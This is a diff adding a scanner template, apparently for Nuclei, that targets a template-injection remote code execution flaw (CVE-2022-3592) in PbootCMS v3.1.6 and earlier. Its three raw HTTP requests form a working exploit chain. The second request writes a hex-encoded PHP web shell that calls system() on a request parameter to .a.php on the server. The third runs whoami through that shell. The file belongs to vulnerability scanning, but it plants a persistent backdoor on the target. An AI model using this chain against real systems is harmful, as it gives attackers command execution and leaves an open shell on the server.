@@ -1,0 +1,63 @@
+id: CVE-2022-3592
+
+info:
+  name: PbootCMS <=v3.1.6 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Template injection exists in PbootCMS <=v3.1.6. Attackers can exploit this vulnerability to execute arbitrary code and gain server permissions.
+  tags: rce, pbootcms
+  reference:
+    - https://fofa.so/
+
+variables:
+  randString: '{{rand_base(16)}}'
+  md5hash: '{{md5(randString)}}'
+
+http:
+  - raw:
+      - |
+        GET /?member/login/aaaaaa}{pboot:if(true);use/**/function/**/var_dump/**/as/**/test;use/**/function/**/md5/**/as/**/test1;use/**/function/**/get/**/as/**/test3;test(test1(test3('content')));if(true)}{/pboot:if}&content={{randString}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{md5hash}}'
+
+  - raw:
+      - |
+        GET /?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=.a.php&content=3c3f7068702073797374656d28245f524551554553545b276161275d293b3f3e HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<\\?php system\\(\\$_REQUEST\\['aa'\\]\\);\\?>"
+
+  - raw:
+      - |
+        GET /.a.php?aa=whoami HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root"
